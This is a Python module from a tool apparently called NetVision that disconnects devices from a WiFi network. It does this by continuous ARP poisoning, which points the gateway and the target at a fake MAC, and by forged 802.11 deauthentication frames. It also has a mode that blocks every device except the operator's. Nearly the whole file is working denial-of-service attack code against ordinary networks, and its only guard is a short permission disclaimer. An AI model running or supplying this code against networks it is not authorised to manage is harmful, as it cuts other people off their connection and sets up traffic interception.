"""
NetVision — WiFi Blocker Module
Disconnect devices from the WiFi network using:
  1. ARP Poisoning (Layer 2) — Works on managed-mode interfaces
  2. WiFi Deauth Frames (Layer 1) — Requires monitor-mode interface

⚠ Use only on networks you own or have explicit permission to manage.
"""

import threading
import time
import subprocess
from datetime import datetime
from collections import defaultdict

try:
    from scapy.all import (
        ARP, Ether, IP, send, sendp, srp, conf,
        RadioTap, Dot11, Dot11Deauth,
    )
    SCAPY_OK = True
except ImportError:
    SCAPY_OK = False


class BlockedDevice:
    """Tracks a blocked device's state."""

    def __init__(self, ip, mac="", name="", method="arp", duration=0):
        self.ip = ip
        self.mac = mac
        self.name = name
        self.method = method          # "arp" or "deauth"
        self.duration = duration      # 0 = indefinite
        self.started = datetime.now()
        self.packets_sent = 0
        self.is_active = True

    @property
    def elapsed(self):
        return (datetime.now() - self.started).seconds

    @property
    def remaining(self):
        if self.duration == 0:
            return "∞"
        left = self.duration - self.elapsed
        return f"{max(0, left)}s"

    def to_dict(self):
        return {
            "ip": self.ip,
            "mac": self.mac,
            "name": self.name,
            "method": self.method,
            "duration": self.duration,
            "elapsed": self.elapsed,
            "remaining": self.remaining,
            "packets_sent": self.packets_sent,
            "is_active": self.is_active,
            "started": self.started.strftime("%H:%M:%S"),
        }


class WiFiBlocker:
    """
    Block/disconnect devices from the WiFi network.

    Methods:
      - ARP Poisoning: Floods target with fake ARP replies pointing the
        gateway to a dead MAC. Works on any interface. Very effective.
      - WiFi Deauth: Sends 802.11 deauth frames directly. Requires a
        monitor-mode interface (e.g., wlan0mon).
    """

    def __init__(self, interface, gateway_ip, gateway_mac=None):
        self.interface = interface
        self.gateway_ip = gateway_ip
        self.gateway_mac = gateway_mac or self._get_gateway_mac()
        self._blocked = {}          # ip -> BlockedDevice
        self._lock = threading.Lock()
        self._running = True
        self._threads = {}          # ip -> Thread
        self._log = []              # action log

    def _get_gateway_mac(self):
        """Resolve gateway MAC via ARP."""
        if not SCAPY_OK:
            return "ff:ff:ff:ff:ff:ff"
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.gateway_ip),
                timeout=3, verbose=False, iface=self.interface,
            )
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return "ff:ff:ff:ff:ff:ff"

    def _resolve_mac(self, ip):
        """Resolve a device's MAC address via ARP."""
        if not SCAPY_OK:
            return ""
        try:
            ans, _ = srp(
                Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),
                timeout=2, verbose=False, iface=self.interface,
            )
            if ans:
                return ans[0][1].hwsrc
        except Exception:
            pass
        return ""

    # ─── BLOCKING METHODS ────────────────────────────────

    def block_device(self, target_ip, target_mac="", name="", method="arp",
                     duration=0):
        """
        Block a device from the network.

        Args:
            target_ip: IP of device to block
            target_mac: MAC of device (auto-resolved if empty)
            name: Friendly device name
            method: "arp" (default, works everywhere) or "deauth" (needs monitor mode)
            duration: Seconds to block (0 = until manually unblocked)
        """
        if not SCAPY_OK:
            return False

        # Already blocked?
        with self._lock:
            if target_ip in self._blocked and self._blocked[target_ip].is_active:
                return True

        # Resolve MAC if needed
        if not target_mac:
            target_mac = self._resolve_mac(target_ip)
            if not target_mac:
                self._add_log(f"❌ Cannot resolve MAC for {target_ip}")
                return False

        # Create blocked device record
        device = BlockedDevice(
            ip=target_ip, mac=target_mac, name=name,
            method=method, duration=duration,
        )

        with self._lock:
            self._blocked[target_ip] = device

        # Start blocking thread
        if method == "deauth":
            t = threading.Thread(
                target=self._deauth_loop,
                args=(device,), daemon=True,
            )
        else:
            t = threading.Thread(
                target=self._arp_block_loop,
                args=(device,), daemon=True,
            )

        self._threads[target_ip] = t
        t.start()

        self._add_log(f"🚫 BLOCKED {name or target_ip} ({target_mac}) via {method.upper()}"
                      f" {'for ' + str(duration) + 's' if duration else 'indefinitely'}")
        return True

    def unblock_device(self, target_ip):
        """Stop blocking a device and restore its connection."""
        with self._lock:
            if target_ip not in self._blocked:
                return False
            self._blocked[target_ip].is_active = False

        # Send correct ARP to restore connectivity
        try:
            device = self._blocked[target_ip]
            if device.method == "arp" and device.mac:
                # Send legitimate ARP: gateway is at real gateway MAC
                pkt = Ether(dst=device.mac) / ARP(
                    op=2, pdst=target_ip,
                    hwdst=device.mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac,
                )
                sendp(pkt, verbose=False, iface=self.interface, count=5)
        except Exception:
            pass

        self._add_log(f"✅ UNBLOCKED {device.name or target_ip}")
        return True

    def unblock_all(self):
        """Unblock all blocked devices."""
        with self._lock:
            ips = list(self._blocked.keys())
        for ip in ips:
            self.unblock_device(ip)

    def block_all_except(self, keep_ips, device_list, duration=0):
        """
        Block ALL devices on the network EXCEPT the specified IPs.
        Useful for "only allow my device" mode.

        Args:
            keep_ips: List of IPs to keep connected (your device)
            device_list: List of (ip, mac, name) tuples of network devices
            duration: Block duration (0 = indefinite)
        """
        blocked_count = 0
        for ip, mac, name in device_list:
            if ip not in keep_ips and ip != self.gateway_ip:
                if self.block_device(ip, mac, name, duration=duration):
                    blocked_count += 1
        return blocked_count

    # ─── BLOCKING LOOPS ──────────────────────────────────

    def _arp_block_loop(self, device):
        """Continuously send fake ARP to disconnect a device."""
        FAKE_MAC = "de:ad:be:ef:ca:fe"

        while self._running and device.is_active:
            # Check duration
            if device.duration > 0 and device.elapsed >= device.duration:
                device.is_active = False
                self._add_log(f"⏱️ Block expired for {device.name or device.ip}")
                break

            try:
                # Tell target: gateway is at FAKE_MAC (breaks their internet)
                pkt_to_target = Ether(dst=device.mac) / ARP(
                    op=2,
                    pdst=device.ip,
                    hwdst=device.mac,
                    psrc=self.gateway_ip,
                    hwsrc=FAKE_MAC,
                )
                sendp(pkt_to_target, verbose=False, iface=self.interface, count=3)

                # Tell gateway: target is at FAKE_MAC (drops return packets)
                pkt_to_gw = Ether(dst=self.gateway_mac) / ARP(
                    op=2,
                    pdst=self.gateway_ip,
                    hwdst=self.gateway_mac,
                    psrc=device.ip,
                    hwsrc=FAKE_MAC,
                )
                sendp(pkt_to_gw, verbose=False, iface=self.interface, count=3)

                device.packets_sent += 6
            except Exception:
                pass

            time.sleep(0.3)  # Aggressive — every 300ms

        # Restore on exit
        self._restore_arp(device)

    def _deauth_loop(self, device):
        """Send WiFi deauth frames to disconnect a device."""
        # Try to find the BSSID (AP MAC) from the system
        bssid = self._get_bssid()

        if not bssid:
            self._add_log(f"⚠️ Cannot find BSSID for deauth, falling back to ARP")
            device.method = "arp"
            self._arp_block_loop(device)
            return

        while self._running and device.is_active:
            if device.duration > 0 and device.elapsed >= device.duration:
                device.is_active = False
                self._add_log(f"⏱️ Deauth expired for {device.name or device.ip}")
                break

            try:
                # Deauth from AP to client
                pkt1 = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1=device.mac,
                    addr2=bssid,
                    addr3=bssid,
                ) / Dot11Deauth(reason=7)

                # Deauth from client to AP
                pkt2 = RadioTap() / Dot11(
                    type=0, subtype=12,
                    addr1=bssid,
                    addr2=device.mac,
                    addr3=bssid,
                ) / Dot11Deauth(reason=7)

                sendp(pkt1, iface=self.interface, count=5, inter=0.02, verbose=False)
                sendp(pkt2, iface=self.interface, count=5, inter=0.02, verbose=False)
                device.packets_sent += 10
            except Exception:
                pass

            time.sleep(0.1)

    def _restore_arp(self, device):
        """Send correct ARP to restore device connectivity."""
        try:
            if device.mac and self.gateway_mac:
                # Tell target: gateway is at real MAC
                pkt = Ether(dst=device.mac) / ARP(
                    op=2, pdst=device.ip,
                    hwdst=device.mac,
                    psrc=self.gateway_ip,
                    hwsrc=self.gateway_mac,
                )
                sendp(pkt, verbose=False, iface=self.interface, count=5)
        except Exception:
            pass

    def _get_bssid(self):
        """Get the BSSID (AP MAC) of the connected network."""
        try:
            result = subprocess.run(
                ["iwconfig", self.interface],
                capture_output=True, text=True, timeout=3,
            )
            import re
            match = re.search(r"Access Point:\s+([0-9A-Fa-f:]{17})", result.stdout)
            if match:
                return match.group(1)
        except Exception:
            pass
        return None

    # ─── STATUS & API ─────────────────────────────────────

    def get_blocked_devices(self):
        """Get list of currently blocked devices."""
        with self._lock:
            return {
                ip: dev.to_dict()
                for ip, dev in self._blocked.items()
                if dev.is_active
            }

    def get_all_history(self):
        """Get all blocked devices (including expired)."""
        with self._lock:
            return {ip: dev.to_dict() for ip, dev in self._blocked.items()}

    def get_block_count(self):
        """Get count of actively blocked devices."""
        with self._lock:
            return sum(1 for d in self._blocked.values() if d.is_active)

    def get_log(self, limit=20):
        """Get recent action log."""
        return self._log[-limit:]

    def is_blocked(self, ip):
        """Check if a device is currently blocked."""
        with self._lock:
            return ip in self._blocked and self._blocked[ip].is_active

    def _add_log(self, msg):
        """Add timestamped log entry."""
        entry = f"[{datetime.now().strftime('%H:%M:%S')}] {msg}"
        self._log.append(entry)

    def stop(self):
        """Stop all blocking and restore all devices."""
        self._running = False
        self.unblock_all()
        # Wait for threads to finish
        for t in self._threads.values():
            t.join(timeout=2)
